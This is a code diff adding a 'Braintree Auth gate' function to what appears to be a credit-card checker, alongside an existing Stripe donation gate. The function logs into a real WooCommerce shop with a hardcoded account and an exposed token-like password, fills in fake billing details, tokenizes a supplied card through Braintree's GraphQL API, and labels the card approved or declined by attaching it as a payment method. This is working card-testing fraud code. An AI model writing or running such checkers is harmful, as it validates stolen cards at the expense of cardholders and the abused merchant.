@@ -419,3 +419,223 @@ def check_stripe_donation(cc, proxy=None):
             continue
 
     return "All donation sites failed", "ERROR"
+
+# ============================================================================
+# 🚪 GATE 4: braintree Auth
+# ============================================================================
+def check_braintree_mass(cc, proxy=None):
+    """
+    Mass Braintree gate using bandc.com (auth).
+    Returns (response_text, status)
+    """
+    try:
+        # The function expects cc in format "CC|MM|YYYY|CVV"
+        cc = cc.strip()
+        parts = cc.split('|')
+        if len(parts) < 4:
+            return "Invalid card format", "ERROR"
+        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
+        if len(yy) == 4:
+            yy = yy[2:]  # convert to YY
+
+        # Use the provided proxy (the function in your separate bot doesn't use proxies, but we can pass it)
+        # Since the original doesn't use proxies, we ignore proxy for simplicity.
+
+        import base64, random, string, time, uuid
+        from user_agent import generate_user_agent
+        from faker import Faker
+
+        r = requests.Session()
+        user = generate_user_agent()
+
+        # Step 1: Get login nonce
+        headers = {
+            'authority': 'bandc.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://bandc.com/my-account/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        resp = r.get('https://bandc.com/my-account/', headers=headers)
+        logen = resp.text.split('name="woocommerce-login-nonce" value="')[1].split('"')[0]
+
+        # Step 2: Login with a pre-defined email/password
+        emails = ['aitiktokbetatefa@gmail.com']
+        email = random.choice(emails)
+        data = {
+            'username': email,
+            'password': '7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y',  # this looks like a token, but it's used as password? Keep as original.
+            'woocommerce-login-nonce': logen,
+            '_wp_http_referer': '/my-account/',
+            'login': 'Login',
+        }
+        headers = {
+            'authority': 'bandc.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://bandc.com',
+            'referer': 'https://bandc.com/my-account/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        r.post('https://bandc.com/my-account/', headers=headers, data=data)
+
+        # Step 3: Get address nonce
+        headers = {
+            'authority': 'bandc.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://bandc.com/my-account/edit-address/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        resp = r.get('https://bandc.com/my-account/edit-address/billing/', headers=headers)
+        address = re.search(r'name="_wpnonce" value="(.*?)"', resp.text).group(1)
+
+        # Step 4: Update billing address
+        fake = Faker()
+        foon = ''.join(random.choice('1234567890') for i in range(11))
+        data = {
+            'billing_first_name': fake.first_name(),
+            'billing_last_name': fake.last_name(),
+            'billing_company': '',
+            'billing_country': 'US',
+            'billing_address_1': fake.street_address(),
+            'billing_address_2': '',
+            'billing_city': fake.city(),
+            'billing_state': fake.state(),
+            'billing_postcode': '10080',
+            'billing_phone': foon,
+            'billing_email': email,
+            'save_address': 'Save address',
+            '_wpnonce': address,
+            '_wp_http_referer': '/my-account/edit-address/billing/',
+            'action': 'edit_address',
+        }
+        headers = {
+            'authority': 'bandc.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://bandc.com',
+            'referer': 'https://bandc.com/my-account/edit-address/billing/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        r.post('https://bandc.com/my-account/edit-address/billing/', headers=headers, data=data)
+
+        # Step 5: Get client token nonce
+        headers = {
+            'authority': 'bandc.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://bandc.com/my-account/payment-methods/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        resp = r.get('https://bandc.com/my-account/add-payment-method/', headers=headers)
+        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text).group(1)
+        add_nonce = re.search(r'name="_wpnonce" value="(.*?)"', resp.text).group(1)
+
+        # Step 6: Get client token
+        headers = {
+            'authority': 'bandc.com',
+            'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://bandc.com',
+            'referer': 'https://bandc.com/my-account/add-payment-method/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
+        resp = r.post('https://bandc.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+        enc = resp.json()['data']
+        dec = base64.b64decode(enc).decode('utf-8')
+        auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+
+        # Step 7: Tokenize card via Braintree GraphQL
+        headers = {
+            'authority': 'payments.braintree-api.com',
+            'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'authorization': f'Bearer {auth_fingerprint}',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        ssr = str(uuid.uuid4())
+        json_data = {
+            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': ssr},
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
+            'variables': {
+                'input': {
+                    'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc},
+                    'options': {'validate': False}
+                }
+            },
+            'operationName': 'TokenizeCreditCard'
+        }
+        resp = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+        token = resp.json()['data']['tokenizeCreditCard']['token']
+
+        # Step 8: Submit payment method
+        headers = {
+            'authority': 'bandc.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://bandc.com',
+            'referer': 'https://bandc.com/my-account/add-payment-method/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': user,
+        }
+        data = {
+            'payment_method': 'braintree_credit_card',
+            'wc-braintree-credit-card-card-type': 'master-card',
+            'wc-braintree-credit-card-3d-secure-enabled': '',
+            'wc-braintree-credit-card-3d-secure-verified': '',
+            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+            'wc_braintree_credit_card_payment_nonce': token,
+            'wc_braintree_device_data': '',
+            'wc-braintree-credit-card-tokenize-payment-method': 'true',
+            '_wpnonce': add_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }
+        resp = r.post('https://bandc.com/my-account/add-payment-method/', headers=headers, data=data)
+        text = resp.text
+        if 'Payment method successfully added.' in text or 'Nice! New payment method added' in text:
+            return "Approved ✅", "APPROVED"
+        elif 'risk_threshold' in text:
+            return "RISK: Retry later", "DECLINED"
+        elif 'Please wait for 20 seconds.' in text:
+            time.sleep(20)
+            return "Retry", "ERROR"
+        else:
+            return "Declined", "DECLINED"
+    except Exception as e:
+        return f"Error: {str(e)}", "ERROR"
+
